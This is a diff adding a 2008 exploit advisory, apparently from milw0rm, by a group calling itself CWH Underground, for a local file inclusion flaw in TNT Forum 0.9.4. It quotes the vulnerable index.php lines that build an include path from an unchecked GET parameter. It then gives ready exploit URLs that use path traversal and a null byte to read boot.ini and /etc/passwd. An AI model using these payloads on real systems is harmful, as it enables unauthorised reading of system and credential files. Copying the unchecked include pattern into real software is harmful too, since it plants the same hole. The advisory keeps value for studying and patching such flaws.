@@ -1,0 +1,52 @@
+======================================================
+ TNT Forum 0.9.4 Local File Inclusion Vulnerabilities
+======================================================
+
+  ,--^----------,--------,-----,-------^--,
+  | |||||||||   `--------'     |          O	.. CWH Underground Hacking Team ..
+  `+---------------------------^----------|
+    `\_,-------, _________________________|
+      / XXXXXX /`|     /
+     / XXXXXX /  `\   /
+    / XXXXXX /\______(
+   / XXXXXX /           
+  / XXXXXX /
+ (________(             
+  `------'
+
+
+AUTHOR : CWH Underground
+DATE : 10 June 2008
+SITE : www.citec.us
+
+
+#####################################################
+ APPLICATION : TNT Forum
+ VERSION     : 0.9.4
+ DOWNLOAD    : download.tntforum.tuttoeniente.net
+#####################################################
+
+---LFI---
+
+#################################################################
+Vulnerable in index.php:
+
+   137:	//Variabili generali
+   138:	$modulo = @$_GET['modulo'];
+   139:	$modfile = 'mod_'.$modulo.'.php';
+#################################################################
+
+Exploit:
+
+[+] For Windows
+http://[Target]/[tntforum_path]/index.php?modulo=../../../../../../../../boot.ini%00
+
+[+] For Linux
+http://localhost/tntforum/index.php?modulo=../../../../../../../../etc/passwd%00
+
+
+##################################################################
+# Greetz: ZeQ3uL, BAD $ectors, Snapter, Conan, JabAv0C, Win7dos  #
+##################################################################
+
+# milw0rm.com [2008-06-10]
